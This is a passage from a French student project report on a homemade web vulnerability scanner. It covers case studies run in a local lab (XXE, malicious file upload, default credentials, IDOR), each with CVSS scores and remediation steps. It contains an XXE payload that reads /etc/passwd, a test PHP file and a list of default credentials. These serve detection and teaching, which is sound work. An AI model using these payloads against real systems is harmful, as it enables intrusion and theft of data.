Cible : http://127.0.0.1:5001/xml   |   Methode : POST   |   Corps : XML
L'endpoint /xml parse le corps XML de la requête avec un parseur qui autorise le traitement des entités externes (DTD). L'attaquant peut définir une entité externe pointant vers un fichier local pour l'exfiltrer dans la réponse.
Code : Résultat — XXE Injection
Payload XML :<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><request><data>&xxe;</data></request>Preuve           : Contenu de /etc/passwd inclus dans la réponse XMLScore CVSS       : 8.2 — ÉlevéVecteur          : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L
Remédiation : Désactiver les entités externes dans le parseur XML (lxml : parser.resolve_entities=False), utiliser defusedxml en Python, préférer JSON quand XML n'est pas strictement nécessaire.
3.5.6  Étude de Cas 6 : Upload de Fichier Malveillant (OWASP A04) — CVSS 8.8 ÉLEVÉ
Cible : http://127.0.0.1:5001/upload   |   Méthode : POST   |   Champ : uploaded
Le scanner génère un fichier PHP avec un marqueur unique (UUID), l'uploade, puis tente d'y accéder via HTTP. Si le marqueur est retourné dans la réponse, cela confirme que le fichier est exécutable (ou au minimum accessible) sur le serveur.
Code : Résultat — Unrestricted File Upload
Fichier uploadé  : 806a29fb_shell.php (Content-Type: application/x-php)Contenu          : <?php echo "MARKER_806a29fb"; ?>URL de vérif.    : http://127.0.0.1:5001/uploads/806a29fb_shell.phpPreuve           : Marqueur 'MARKER_806a29fb' retrouvé dans la réponse HTTP 200Score CVSS       : 8.8 — ÉlevéVecteur          : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:HImpact           : Exécution de code arbitraire sur le serveur (RCE)
Remédiation : Valider l'extension ET les magic bytes côté serveur, utiliser une whitelist d'extensions (.jpg, .png, .pdf uniquement), stocker les uploads hors du webroot, servir les fichiers via un endpoint dédié avec Content-Disposition: attachment, désactiver l'exécution PHP dans le répertoire d'upload.
3.5.7  Étude de Cas 7 : Authentification Défaillante (OWASP A07) — CVSS 9.8 CRITIQUE
Cible : http://127.0.0.1:5001/login   |   Methode : POST   |   Parametres : username, password
Le détecteur AuthFailures tente une liste de credentials par défaut (admin:admin, admin:password, root:root, admin:123456, etc.) sur le formulaire de login détecté par le crawler. La réponse est analysée pour détecter les signes de succès (redirection vers un dashboard, disparition du formulaire, token de session).
Code : Résultats — Auth Failures + Cryptographic Failures
Payload          : username=admin, password=adminPreuve           : Identifiants par défaut acceptés — redirection vers /dashboardScore CVSS       : 9.8 — CritiqueVecteur          : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:HPayload          : HTTP en clair (formulaire password servi en HTTP)Preuve           : Champ <input type="password"> détecté sur page HTTP (non HTTPS)Score CVSS       : 7.5 — Élevé (Cryptographic Failures A02)Impact           : Compromission complète du compte, interception des credentials
3.5.8  Étude de Cas 8 : IDOR (OWASP A01) — CVSS 6.5 MOYEN
Cible : http://127.0.0.1:5001/user?id=...   |   Paramètre : id
Le détecteur IDOR incrémente et décrémente les paramètres numériques (id, user_id, account_id, etc.) et compare les réponses. Si des contenus différents sont retournés pour des IDs différents sans erreur 403, une IDOR est suspectée.
Code : Résultat — IDOR
Payload          : id=1 → id=2 → id=3Observation      : Contenu différent retourné pour chaque ID (données d'autres utilisateurs)Statut HTTP      : 200 OK pour tous les IDs (aucun contrôle d'accès)Score CVSS       : 6.5 — MoyenVecteur          : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:NImpact           : Accès aux données personnelles de tous les utilisateurs

Analyse des résultats de performance
   • Le pipeline est linéaire en O(pages × détecteurs × payloads) — scalable.

   • Le mode --only sqli,xss réduit le temps de 70 % tout en couvrant les failles les plus critiques.

Conclusion Générale
Ce Projet de Fin d'Année nous a permis de mener un travail complet en cybersécurité applicative : de l'analyse théorique des menaces jusqu'à la réalisation et la validation d'un outil de détection opérationnel. Nous présentons ci-dessous un bilan synthétique des contributions de chaque chapitre et des perspectives d'évolution du projet.
Bilan du Chapitre 1 — État de l'Art
Le premier chapitre a établi les fondements théoriques du projet. Nous avons dressé un panorama complet des cybermenaces web (MITM, injections, SSRF, XXE, IDOR, etc.), analysé en profondeur les dix catégories de l'OWASP Top 10 2021 avec leurs statistiques de prévalence, comparé les quatre outils de référence du marché (ZAP, Burp Suite, Nikto, Acunetix) sur 14 critères, et expliqué le standard CVSS v3.1 utilisé pour scorer nos détections. Cette analyse a mis en évidence le vide dans l'offre actuelle justifiant notre approche : un outil open source, Python-natif, léger et pédagogique.
Bilan du Chapitre 2 — Conception
Le second chapitre a formalisé notre conception via une approche UML rigoureuse : architecture en pipeline à cinq étapes (Crawl → Detect → Deduplicate → Evaluate → Report), diagramme de cas d'utilisation (8 UC), diagramme de classes complet (7 classes, 3 patterns de conception), diagramme de séquence d'un scan complet, description détaillée des 12 modules de détection, et topologie réseau de l'environnement virtualisé (2 VMs VirtualBox en Host-Only). La conception modulaire garantit l'extensibilité : ajouter un nouveau détecteur ne nécessite que la création d'une nouvelle classe héritant de BaseDetector.
Bilan du Chapitre 3 — Réalisation
Le troisième chapitre a présenté la réalisation complète. L'environnement de test virtualisé (Ubuntu 22.04 + DVWA + VirtualBox Host-Only) garantit l'isolation et la reproductibilité. L'implémentation en Python 3.11 couvre 12 détecteurs, un crawler BFS, un evaluator CVSS et un générateur de rapports HTML. La suite de 42 tests unitaires valide chaque composant. Les huit études de cas démontrent la détection effective de toutes les vulnérabilités majeures : SQLi (9.8 Critique), Auth Failures (9.8 Critique), File Upload (8.8 Élevé), SSRF (8.5 Élevé), XXE (8.2 Élevé), Path Traversal (7.5 Élevé), XSS (6.1 Moyen), IDOR (6.5 Moyen). Au total : 70 vulnérabilités détectées en 6 secondes sur 11 pages, couvrant 9 catégories sur 10 de l'OWASP Top 10.
Perspectives d'Évolution
Plusieurs axes d'amélioration sont envisagés pour les versions futures :
Court terme : Détecteur A09 (Logging & Monitoring) : analyse des en-têtes de réponse et des configurations de journalisation via l'API d'administration.
Court terme : Parallélisme des requêtes HTTP via asyncio et aiohttp pour réduire significativement le temps de scan sur les grandes applications.
Moyen terme : Support des SPA JavaScript via Playwright (crawl dynamique du DOM après exécution JS) pour couvrir les applications React/Angular/Vue.
Moyen terme : Intégration CI/CD native (GitHub Actions, GitLab CI) avec seuils de sévérité configurables (fail si CVSS >= 9.0).
Long terme : Interface web de configuration et de visualisation des résultats en temps réel (WebSocket + React).
Long terme : Support des APIs REST et GraphQL avec génération automatique de cas de test depuis les spécifications OpenAPI/Swagger.
Ce projet a été une opportunité unique d'allier théorie et pratique dans le domaine de la cybersécurité offensive et défensive. Les compétences acquises — Python avancé, architecture logicielle, protocoles HTTP, vulnérabilités OWASP, CVSS v3.1, virtualisation, tests unitaires — constituent un socle solide pour une carrière dans la sécurité informatique.
